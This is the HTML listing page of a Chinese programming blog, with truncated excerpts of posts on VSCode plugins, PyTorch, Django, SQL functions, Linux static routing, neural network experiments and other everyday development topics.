<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/901f543b998251af257bf1910b22e121/" rel="bookmark">
			VSCode格式化shell脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装格式化插件：shell-format 用VSCode打开shell脚本之后，按格式化快捷键Ctrl+Alt+F，会提示没有格式化shell的工具，然后安装插件，我装的是这个插件：shell-format。
介绍：https://marketplace.visualstudio.com/items?itemName=foxundermoon.shell-format
GitHub：https://github.com/mvdan/sh
用法 Ctrl+Alt+F右键 --&gt; 格式化文档 插件不生效问题排查及处理 安装成功后，尝试格式化好几次，都没有生效，然后发现控制台有报错：
shfmt hasn't downloaded yet!Error: ENOENT: no such file or directory, stat 'c:\Users\Administrator\.vscode\extensions\foxundermoon.shell-format-7.2.5\bin\shfmt_v3.6.0_windows_amd64.exe' Shfmt will be downloaded automatically! download url: https://github.com/mvdan/sh/releases/download/v3.6.0/shfmt_v3.6.0_windows_amd64.exe download to: c:\Users\Administrator\.vscode\extensions\foxundermoon.shell-format-7.2.5\bin\shfmt_v3.6.0_windows_amd64.exe If the download fails, you can manually download it to the dest directory. Or download to another directory, and then set the "shellformat.path" as the path download shfmt page: https://github.com/mvdan/sh/releases You can't use this plugin until the download is successful.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/901f543b998251af257bf1910b22e121/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/912fb2455d2d05459dcbacde522b769f/" rel="bookmark">
			IDEA 中使用 while(scanner.hasnext()) 如何结束输入，tracktest 代码测验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		按 ctrl + d 即可。不用写回车结束输入什么的
ctrl + d 结束输入 import java.util.ArrayList; import java.util.Scanner; public class Test { public static void main(String[] args) { String[] lines = getStdin(); for (int i = 0, l = lines.length; i &lt; l; i++) { String output = String.format("Hello %s!", lines[i]); System.out.println(output); } } private static String[] getStdin() { Scanner scanner = new Scanner(System.in); ArrayList&lt;String&gt; lines = new ArrayList&lt;&gt;(); while (scanner.hasNext()) { lines.add(scanner.nextLine()); } String[] strings = lines.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/912fb2455d2d05459dcbacde522b769f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b8ea4d05617cb03f9420b2926a5de4f/" rel="bookmark">
			解决AttributeError: ‘DataParallel‘ object has no attribute ‘xxxx‘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 训练模型时，分阶段训练，第二阶段加载第一阶段训练好的模型的参数，接着训练
第一阶段训练，含有代码
if (train_on_gpu): if torch.cuda.device_count() &gt; 1: net = nn.DataParallel(net) net = net.to(device) 第二阶段训练，含有代码
if (train_on_gpu): if torch.cuda.device_count() &gt; 1: netT = nn.DataParallel(netT) netS = nn.DataParallel(netS) netT = netT.to(device) netS = netS.to(device) ----- orig_state_dict = torch.load("../models/model.pth")['net'] new_state_dict = OrderedDict() for k, v in orig_state_dict.items(): name = k.replace('module.', '') new_state_dict[name] = v netT.load_state_dict(new_state_dict) ----- for param in netS.parameters(): param.requires_grad = True #对源模型 netS 的 pose_fc1 层所有参数都设置为不需要进行反向传播更新。 for param in netS.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b8ea4d05617cb03f9420b2926a5de4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/196640ed661bd74a9ae2e1ddea04d61f/" rel="bookmark">
			java js
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Cocos2dxJavascriptJavaBridge.evalString("JsbUtil.javaToJs('" + msg + "');"); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b9afb89a6acc1575b159bfca38d10ad/" rel="bookmark">
			django
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		django学习 初识Django1.安装django2.创建项目2.1 在终端2.2 Pycharm 3. 创建app4.快速上手4.1 再写一个页面4.2 templates模板4.3 静态文件4.3.1 static目录4.3.2 引用静态文件 5.模板语法案例：伪联通新闻中心6.请求和响应案例：用户登录7.数据库操作7.1 安装第三方模块7.2 ORM1. 自己创建数据库2. django连接数据库3.django操作表4.表中的数据 案例：用户管理1. 展示用户列表2.添加用户3.删除用户 Django开发（一）1.新建项目2.创建app3.设计表结构（django）4.在MySQL中生成表5.静态文件管理6.部门管理7.模板的继承8.用户管理8.1 初识Form1. views.py2.user_add.html 8.3 ModelForm（推荐）0. models.py1. views.py2.user_add.html Django开发（二）8.4 编辑用户8.5 删除 9.靓号管理9.1 表结构9.2 靓号列表9.3 新建靓号9.4 编辑靓号9.5 搜索手机号9.6 分页 10.时间插件11.ModelForm和BootStrap操作 Django开发（三）1.Ajax请求2.订单小结3.图表 Django开发（四）1.知识点复习1.1 基础入门1.2 数据类型1.3 函数1.4 模块1.5 面向对象1.6 MySQL数据库1.7 前端开发1.8 Django 2.关于文件上传2.1 基本操作案例：批量上传数据案例：混合数据（Form）2.2 启用media案例：混合数据（form）案例：混合数据（ModalForm)models.py定义ModelForm视图 小结 总结 初识Django Python知识点：函数、面向对象。前端开发：HTML、CSS、JavaScript、jQuery、BootStrap。MySQL数据库。Python的Web框架： Flask，自身短小精悍 + 第三方组件。Django，内部已集成了很多组件 + 第三方组件。【主要】 1.安装django pip install django c:\python39 - python.exe - Scripts - pip.exe - django-admin.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b9afb89a6acc1575b159bfca38d10ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e743540057dd2d67e45a5f7b7c1f674f/" rel="bookmark">
			真空电子管、晶体管&amp;DRAM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 导读读完这篇文章，你可以回答什么？ 2. 起源3. Q1-&gt;A14. Q2-&gt;A25. Q3-&gt;A36. Reference7. 声明 1. 导读 读完这篇文章，你可以回答什么？ 什么是真空电子管？真空电子管的基本原理？为什么后来不研究真空电子管了，改成去研究晶体管？谁发明了晶体管？晶体管的类型以及发展历程？谁发明了DRAM？为什么？ 2. 起源 1800年伏达（vlota）发明了电池，因此我们可以对电进行学习，但在这之前我们只知道静电的存在，自从电池被发明之后，我们就可以更系统的学习相关的东西。世界上，有很多奇怪的人，在这样的人当中有人制造了玻璃管，为什么发明玻璃管呢？现在想，应该是为了控制灯耗而发明，爱迪生在研究灯泡的时候想的是延长灯亮的时间，那么讲究通过排空灯中的空气，之后，和电相连。如果不是特别古怪的人应该不会有这种想法，因此会产生独特的想法。阴极发出了光，形成光线，人们第一次看到这个会感到特别神奇。如果不感到神奇，那这个人有问题。之后，就有了真空管，从爱迪生到弗莱明再到弗雷斯特，都有着巨大的贡献。
3. Q1-&gt;A1 真空电子管是由美国的发明家德·弗雷斯特发明的，他被人们誉为真空三极管之父。其主要受到弗莱明发现的“真空电子二极管（具有单向导电性）”的启发，在阴极和阳极之间加了一个栅极，使得其起到一个控制电流的作用。真空电子管主要的作用是放大。
lLee de Forest, 1906.lPrinciple: Based on the Vacuum Tube, the additional electrode has been added between the negative and positive electrode plate. That is called the Gate Electrode to realized the amplification of signal.l(Vpositive&gt; Vgate&gt; Vnegative) 真空电子管大概由三个部分组成，分别是灯丝（Header）、金属板（Plate）和网格（Grid）。灯丝的作用是产生电子，金属板的作用是接收通过Grid的电子，而网格的作用是控制通过其相应的电子数量，类似于电吉他的拾音器（Pick-up）。正常情况下，灯丝部分产生的是负电子，之后我们给金属板部分加上正电级，那么自然而然地电子会流到金属板去，但如果我们想要加快电子的流速，那么我们就向网格部分也加正电，这就会加速电子的流动。
真空电子管经过很长时间的发展期，不断地优化其大小，降低其功率的损耗，但最终还是放弃了继续优化，其中最具有代表性的就是苏联在上世纪一直延续使用真空电子管；除此之外，电子管的散热性比较差，容易出现过热的现象；成本比较高。反观transistor，体积比较小，工作电压也比较低，方便快捷。真空管制作困难、体积大、耗能高且使用寿命短，使得业界开始期望电子管替代品的出现。
4. Q2-&gt;A2 贝尔实验室成立半导体研发小组，其中威廉·肖克利(William Shockley) 担任组长，成员包括约翰·巴丁 (John Bardeen) 和沃尔特·布拉顿 (Walter Brattain)。
起初，晶体管是一种点触式的，称为Point-contact Transistor（1947）；之后改进成为双端级型晶体管BJT（Bipolar JunctionTransistor ）；再后来就有了FET（Field Effect Transistor），其中包扩JFET（Junction Field Effect Transistor）(1948, William-Shockley)和MOSFET（Metal-Oxide-Semiconductor Field Effect Transistor） (1959, D.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e743540057dd2d67e45a5f7b7c1f674f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddb6e8388f20f2994a1b45778a10b9a4/" rel="bookmark">
			前馈神经网络实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		手动实现前馈神经网络解决回归、二分类、多分类任务，分析实验结果并绘制训练集和测试集的loss曲线；利用torch.nn实现前馈神经网络解决上述回归、二分类、多分类任务，分析实验结果并绘制训练集和测试集的loss曲线；在多分类实验的基础上使用至少三种不同的激活函数，对比使用不同激活函数的实验结果；对多分类任务中的模型，评估隐藏层层数和隐藏单元个数对实验结果的影响使用不同的隐藏层层数和隐藏单元个数，进行对比实验并分析实验结果；在多分类任务实验中分别手动实现和用torch.nn实现dropout，探究不同丢弃率对实验结果的影响（可用loss曲线进行展示）；在多分类任务实验中分别手动实现和用torch.nn实现L2正则化，探究惩罚项的权重对实验结果的影响（可用loss曲线进行展示）；对回归、二分类、多分类任务分别选择上述实验中效果最好的模型，采用10折交叉验证评估实验结果，要求除了最终结果外还需以表格的形式展示每折的实验结果； 本次实验所使用的是在Pycharm 环境下安装的Python 3.9.7版本以及Pytorch 1.10。
（1）回归任务的数据集
回归任务为是单个数据集，数据集的大小为10000且训练集大小为7000，测试集大小为3000。数据集的样本特征维度p为500，且服从如下的高维线性函数。
import torch import numpy as np num_inputs = 500 num_examples = 10000 x_features = torch.tensor(np.random.normal(0, 1, (num_examples, num_inputs)), dtype=torch.float) y_labels = torch.mm(x_features,torch.ones(500,1)*0.0056) + 0.028 y_labels += torch.tensor(np.random.normal(0, 0.01, size=y_labels.size()), dtype=torch.float) #训练集 trainfeatures =x_features[:7000] trainlabels = y_labels[:7000] #测试集 testfeatures =x_features[7000:] testlabels = y_labels[7000:] （2）二分类任务的数据集
二分类任务的数据集由两个数据集构成，两个数据集的大小均为10000且训练集大小为7000，测试集大小为3000。两个数据集的样本特征x的维度均为200，且分别服从均值互为相反数且方差相同的正态分布。两个数据集的样本标签分别为0和1。通过键入下面代码，构造该数据集。
import torch from matplotlib import pyplot as plt num_inputs = 200 #1类 x1 = torch.normal(1,1,(10000, num_inputs)) y1 = torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddb6e8388f20f2994a1b45778a10b9a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acad937c4a562aad9d981cbb26b5c5c7/" rel="bookmark">
			vscode - 配置Prettier插件和.editorconfig文件使用介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1，介绍2，Prettier插件安装3，全局配置（settings.json）4，局部配置（新建.prettierrc文件）5，Prettier格式化优先级（重要）6，使用prettier格式化无效的解决办法7，.editorconfig文件使用介绍 1，介绍 官方解释：Prettier是一个固执己见的代码格式化程序。它通过解析代码并使用自己的规则重新打印代码来强制实现一致的风格，这些规则考虑了最大行长度，并在必要时包装代码。
其实就是一个代码格式化工具，是你写的代码更加合理和优美，同时这个插件配置也是非常的简单；
2，Prettier插件安装 到vsCode的扩展商城安装，如下第一个就是：
3，全局配置（settings.json） 1，在settings.josn 里面进行配置的规则相当于全局配置，当没有使用.prettier配置文件时，格式化代码会按照此规则进行格式化；
在settings.josn里面增加以下配置：
代码如下：
// "prettier.useEditorConfig": false, // 是否使用editorConfig配置文件中的设置 "prettier.semi": true, // 句尾是否填加分号 "prettier.singleQuote": false, //是否使用单引号 "prettier.trailingComma": "none", //禁止随时添加逗号 "prettier.printWidth": 200, //每行代码的限制长度 "prettier.proseWrap": "never", // 文本换行 "prettier.bracketSpacing": true, // 在对象字面量的花括号内侧使用空格作为间隔 2，配置成默认的格式化工具
4，局部配置（新建.prettierrc文件） 在项目的根目录中新建 .prettierrc文件并配置，如下：
代码如下：
{ "semi": true, "singleQuote": false, "trailingComma": "none", "printWidth": 200, "proseWrap": "never", "bracketSpacing": true } 问：既在settings.josn做了全局配置又新建了.prettierrc文件，那么格式化会以那个为主呢；
答：以.prettierrc文件为主；没有此文件时会使用全局配置；
5，Prettier格式化优先级（重要） 优先级如下：
1、项目目录的.prettierrc文件，支持json和分号格式（其实还有很多种）
2、项目目录的.editorconfig文件
3、vscode的配置文件（settings.json）
.editorconfig文件会在下面讲到：
6，使用prettier格式化无效的解决办法 如果你只在settings.json中配置了格式化且你的项目根目录下有 .editorconfig文件 ，此时你的prettierrc默认格式化工具会达不到你的预期效果（或者无效）；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acad937c4a562aad9d981cbb26b5c5c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d6e996badffe2cd28550c72e8224432/" rel="bookmark">
			小敖同学在学数据结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		b站算法与数据结构教程
算法与数据结构 简单排序算法选择排序：每次选择无序序列中最小的值放入有序序列中冒泡排序：比较相邻元素，将最大值冒泡到最右边O(N^2)插入排序： 类似于扑克牌插牌 当前的数小于左边的数就往左交换，当往左换到最左边或者不小于左边数时停止交换。O(N^2)希尔排序快速排序 二分法详解与扩展对数器递归行为和递归行为时间复杂度的估算master公式归并排序 异或运算符 “∧”哈希表 简单排序算法 void swap(int&amp; m, int&amp; n) { int temp = m; m = n; n = temp; } 选择排序：每次选择无序序列中最小的值放入有序序列中 // 选择排序 i从0到n-1，将剩下元素中的最小值与i交换 void selectionSort(vector&lt;int&gt; &amp;a) { int n = a.size(); for (int i = 0; i &lt; n-1; ++i) { int minIndex = i; for (int j = i + 1; j &lt; n; ++j) { // 找到剩下元素中的最小值并得到索引 minIndex = a[minIndex] &lt; a[j] ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d6e996badffe2cd28550c72e8224432/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e302428f02962a5419f8cac2f9f5997e/" rel="bookmark">
			Html&amp;Js笔记（持续更新中...）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Html&amp;Js笔记（持续更新中...） Html&amp;Js笔记（持续更新中...）一. 基本控件的使用1.控件靠右显示2.设置按钮的属性和点击事件3.下拉列表的使用4.js中实现一个按钮的跳转 二. 设置控件的可见性：2.1. 隐藏时占位：2.2. 隐藏时不占位，使用hidden2.3. 隐藏时不占位，使用display2.4 vue中使用show 或hide方法： 三 超链接加加划线和改变颜色： Html&amp;Js笔记（持续更新中…） 你好！ 这是你第一次使用 Markdown编辑器 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。
一. 基本控件的使用 1.控件靠右显示 可以使用CSS的float属性将控件向右浮动，或者使用text-align属性将其父元素的文本对齐方式设置为右对齐。
例如：
&lt;div style="text-align: right;"&gt; &lt;input type="text" style="float: right;"&gt; &lt;/div&gt; 2.设置按钮的属性和点击事件 &lt;input type = "button" style="margin-right: 100px;float: right;background-color: #4C56B6;color: white" onclick="testAlert()"&gt; 3.下拉列表的使用 &lt;select name="myclass" id="id-myclass"&gt; &lt;option value = "一班" selected="selected"&gt;一班&lt;/option&gt; &lt;option value = "二班"&gt;二班&lt;/option&gt; &lt;/select&gt; 4.js中实现一个按钮的跳转 可以使用window.location.href来实现按钮的跳转，例如：
HTML代码：
&lt;button onclick="goToPage()"&gt;跳转到新页面&lt;/button&gt; JavaScript代码：
function goToPage() { window.location.href = "https://www.example.com"; } 当用户点击按钮时，就会跳转到https://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e302428f02962a5419f8cac2f9f5997e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98d7d4e0753eb66f903d723b26edd24f/" rel="bookmark">
			Android 创建 Gradle Task 自动打包并上传至蒲公英
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Android 项目日常开发过程中，经常需要打包给到非开发人员验收或调试，例如测试阶段，就要经常基于测试服务器地址，打包安装包，给到组内测试人员进行测试，并且 BUG 修复完成之后也需要再次打包给到测试人员回测。为了减免机械性的重复步骤，为项目配置不同的 渠道（Product Flavors），不同渠道对应不同的服务器地址，并且为每一个渠道创建一个 Gradle Task 执行打包并上传至蒲公英的操作，同时在蒲公英中配置 Webhook ，最终可实现：执行对应 **渠道（Product Flavors）**的 Gradle Task，即可自动打包并上传至蒲公英，并将包更新信息同步至企业微信、钉钉、飞书等工作群组，使得包更新流程可视化，并简化了开发和测试联调流程。 实现步骤 1.创建 pgyer-upload.gradle 文件 每个渠道的 Task 执行内容一致：打包并记录更新信息后上传至蒲公英 ，所以抽取公共内容（方法）创建如下 pgyer-upload.gradle 文件
import groovy.json.JsonSlurper import java.net.http.HttpClient import java.net.http.HttpRequest import java.net.http.HttpResponse import java.nio.charset.StandardCharsets import java.nio.file.Files import java.text.SimpleDateFormat ext.uploadApk = this.&amp;uploadApk /** * Sept 1 创建执行任务 */ /** * 蒲公英 ApiKey * https://www.pgyer.com/account/api * TODO 替换成自己的蒲公英 APIkey */ static String getApiKey() { return "myApiKey" } /** * 上传 apk 到蒲公英 * @apk 安装包文件 * @flavorName 渠道名 */ def uploadApk(File apk, String flavorName) { if (apk == null) { throw new RuntimeException("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98d7d4e0753eb66f903d723b26edd24f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee1c97ee89570b7c5552ce5fdce134be/" rel="bookmark">
			【论文阅读笔记】Learning high-speed flight in the wild
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Learning high-speed flight in the wild 链接前言方法专家支路agent支路 结果相关知识补漏写在最后 链接 论文原址：https://www.science.org/doi/abs/10.1126/scirobotics.abg5810
github：https://github.com/uzh-rpg/agile_autonomy
前言 现有的传统导航方法分为几个子任务：感知、建图、规划，这篇文章的motivation是认为这样的几个任务按顺序执行，第一个问题是模块之间的交互需要时间，降低了效率，第二是这样顺序执行有可能放大了整个pipeline的错误。因此这篇文章尝试单纯利用双目视觉信息（深度图）和位姿，结合神经网络，生成控制信息，实现了无人机真实场景的高速飞行。
方法 专家支路 先看方法，整个论文的框架图如上所示，看起来还是比较直观，首先是在仿真中，有着更充分先验知识的专家（A部分区域），专家支路在进行路径规划时，对整个平台和地图的状态有充分了解，在此基础上生成一组collision free的路径，这个路径或轨迹是满足以下概率分布的：
其中Z是一个归一化系数，是对P在整个轨迹 τ τ τ求积分的结果。 c ( τ ， τ r e f , C ) c(τ，τ_{ref},C) c(τ，τref​,C)是一个计算cost的函数，遵从如下公式：
其中积分中的前半项， λ c λ_c λc​=1000， C c o l l i s i o n C_{collision} Ccollision​是碰撞代价，这里 r q r_q rq​设置的是0.2，说白了就是距离点云地图 C C C中的障碍物越远，碰撞代价越低，达到2倍仿真无人机半径时取0。
积分后半项， Q Q Q是一个状态成本矩阵（半正定），这里文章好像没写是怎么设定的，后续复现的时候再看看代码里吧~，但总的来说后半项计算的是生成的轨迹与参考轨迹的差值与状态成本的联系，是希望尽量靠近参考轨迹。
总的来说，这个路径的概率分布即越靠近参考路径、越远离 C C C中障碍物，cost越小，P越大。
这个P其实是难以计算的，因为障碍物的多样性、混乱的环境等原因。本文的专家支路采用M-H算法进行采样，去逼近最真实的分布。MH算法的·目标分数函数定义为 s ( τ ) = exp ⁡ ( − c ( τ , τ r e f , C ) ) s(\tau)=\exp \left(-c\left(\tau, \tau_{\mathrm{ref}}, \mathcal{C}\right)\right) s(τ)=exp(−c(τ,τref​,C))，其实就是为了生成的样本能够渐进地服从P这个分布。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee1c97ee89570b7c5552ce5fdce134be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0a6c090d722927aa9a44d46497124d6/" rel="bookmark">
			给大家分享一款超轻量的kettle web端调度监控平台
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在当今的数据驱动时代，企业对于高效的数据抽取和处理变得越来越重要。然而，传统的数据调度和监控往往需要复杂的配置和繁琐的操作，使得整个过程变得费时费力。幸运的是，这款全新的Kettle平台将彻底颠覆你对数据处理的认知。现在就让我们深入了解并体验这个令人兴奋的解决方案吧！
Smart Kettle是一款基于开源Kettle自研的强大而创新的软件，它提供了Kettle核心接口调用基础组件，以及采用Springboot微服务后端架构和丰富的前端技术构建的监控平台。作为一款专注于大数据调度服务的解决方案，Smart Kettle旨在解决企业在数据抽取业务场景中常见的问题，特别是那些无法通过传统的web方式来配置、调度和监控Kettle的痛点，从而极大地简化企业应用的过程。
首先，让我们更深入地了解Smart Kettle的架构。该平台采用了Springboot微服务后端架构，这意味着它具备高度的灵活性、可扩展性和可维护性。通过将各个功能模块拆分成独立的微服务，Smart Kettle能够更好地满足企业不同的需求，并且便于团队协作和系统部署。此外，该平台还利用了丰富的前端技术，如Vue和iView等组件，为用户提供了直观友好的界面和良好的使用体验。
Smart Kettle的主要目标是为企业提供一个集成配置、调度和监控Kettle的全方位解决方案。在传统的数据抽取业务中，往往需要通过繁琐的手动操作或编写复杂的脚本来完成工作，而这些步骤容易出错且耗时。Smart Kettle以其独特的web方式让企业可以更便捷地进行配置和管理，极大地提高了工作效率和准确性。
其次，Smart Kettle提供了直观友好的可视化界面，使得配置Kettle变得简单而直观。用户只需通过简单的拖拽和点击操作，即可完成复杂的数据抽取任务的配置。这种可视化的方式不仅降低了技术门槛，还节省了学习和培训成本，使得任何人都能够轻松上手。
再者，Smart Kettle具备强大的调度功能，可以自动执行预定的任务，无论是按照特定时间表、事件触发还是根据数据源的更新情况。这样一来，企业不再需要依赖人工来启动和控制数据抽取过程，大大减少了错误和延迟。
Smart Kettle还提供了实时监控和告警功能，可以保证数据抽取过程的稳定性和可靠性。管理员和运维团队可以实时查看任务状态、监控性能指标以及异常情况，并在必要时接收即时通知和告警，从而可以快速响应并解决潜在的问题。
在这个高速发展的数字时代，拥有一个可靠、高效的数据调度和监控平台非常关键。通过这款超轻量级Kettle Web端调度监控平台，我们可以告别繁琐的手动配置和操作，享受更加便捷、高效的数据处理体验。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d92b69afd99aff22616cb7588ce86188/" rel="bookmark">
			VUE3 Element-plus el-popover警告问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		针对于浏览器开发者工具提示的警告问题：
会提示以下警告：runtime-core.esm-bundler.js:38 [Vue warn]: Invalid prop: type check failed for prop "content". Expected String with value "10000", got Number with value 10000.
原因是： el-popover的属性 content 的值要是string 不然会报很多次上面的警告
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e08f1df777154323a56e529aadaf21a/" rel="bookmark">
			SQL单行函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单行函数 1.字符串函数 函数示例结果描述upperselect upper('sdfd');SDFD将字母转换为大写lowerselect lower('ABc');abc将字母转换为小写concatselect concat('hello', 'world');‘hello world’字符串连接substr/substringselect substr('hello world', 2, 4);‘ello’截取字符串lengthselect length('hello world');11获取字符串长度instrselect instr('hello world', 'world');7获取子字符串在父字符串中的索引trimselect trim(' hello ');‘hello’去除两端空格ltrimselect ltrim(' hello');‘hello’去除左端的空格rtrimselect rtrim('hello ');‘hello’去除右端的空格replaceselect replace('hello java', 'java', 'world');‘hello world’替换文本 2.数学函数 函数示例结果作用round(x, [y])select round(5.64,1);5.6对指定的值进行四舍五入，可以指定数值位数ytruncateselect truncate(5.6,0);5对指定的数进行截取操作，指定保留位数yceil(x)select ceil(4.56);5返回不小于指定的值x的最小整数，向上取整floor(x)select floor(8.5);8返回不大于指定的值x的最大整数，向下取整abs(x)select abs(-12);12取绝对值 3.日期函数 函数示例结果作用current_timestamp()select current_timestamp();2019-11-07 20:53:47获取当前时间戳current_date()/CURDATE()select current_date();2019-11-07获取当前日期current_time()/CURTIME()select current_time();20:56:00获取当前时间now()select now();2019-11-07 20:57:15获取当前时间ADDDATE(d,n)SELECT ADDDATE("2017-06-15", INTERVAL 10 DAY);2017-06-25计算起始日期d加上n天的日期ADDTIME(t,n)SELECT ADDTIME('2011-11-11 11:11:11', 5);2011-11-11 11:11:16时间t加上时间表达式nDATEDIFF(d1,d2)SELECT DATEDIFF('2001-01-01','2001-02-02');-32计算日期d1-d2之间相隔的天数DATE_ADD(d,INTERVAL expr type)SELECT DATE_ADD("2017-06-15", INTERVAL 10 DAY);2017-06-25计算起始日期d加上一个时间段后的日期DATE_SUB(date,INTERVAL expr type)SELECT DATE_SUB("2017-06-15", INTERVAL 10 DAY);2017-06-05计算起始日期d减去一个时间段后的日期DATE_FORMAT(d,f)SELECT DATE_FORMAT('2011-11-11 11:11:11','%Y-%m-%d %r');2011-11-11 11:11:11 AM按表达式f的要求显示日期dDAY(d)SELECT DAY("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e08f1df777154323a56e529aadaf21a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c096b9191b5bb2111645880341edf2bf/" rel="bookmark">
			Linux系统之静态路由配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Linux系统中配置静态路由可以按照以下步骤进行：
查看当前路由表：
使用 route命令或 ip route命令来查看当前的路由表。例如：
route -n 或
ip route show 添加静态路由：
使用 route命令或 ip route命令来添加静态路由。语法如下：
route add 目标网络地址/子网掩码 gw 网关地址 或
ip route add 目标网络地址/子网掩码 via 网关地址 其中，目标网络地址/子网掩码表示要访问的目标网络的地址和子网掩码，网关地址表示下一跳的网关地址。
例如，要添加一个静态路由以访问目标网络192.168.1.0/24，下一跳网关为192.168.0.1，可以执行以下命令：
route add -net 192.168.1.0/24 gw 192.168.0.1 或
ip route add 192.168.1.0/24 via 192.168.0.1 如果需要指定路由的优先级（跃点数），可以使用 metric选项。较低的 metric值表示更高的优先级。
route add 目标网络地址/子网掩码 gw 网关地址 metric 数值 或
ip route add 目标网络地址/子网掩码 via 网关地址 metric 数值 永久保存静态路由：
在CentOS 7及以上版本的系统中，静态路由的配置会随着网络服务的重启而丢失。为了使静态路由持久化，需要进行额外的配置。 在 /etc/sysconfig/network-scripts/目录中，找到与网络接口相关的配置文件，例如 ifcfg-eth0。编辑该文件，并添加以下配置：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c096b9191b5bb2111645880341edf2bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b679cbe6cc1e503b5ed428034ad00eb/" rel="bookmark">
			【嵌入式学习-STM32F103-USART串口通信】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
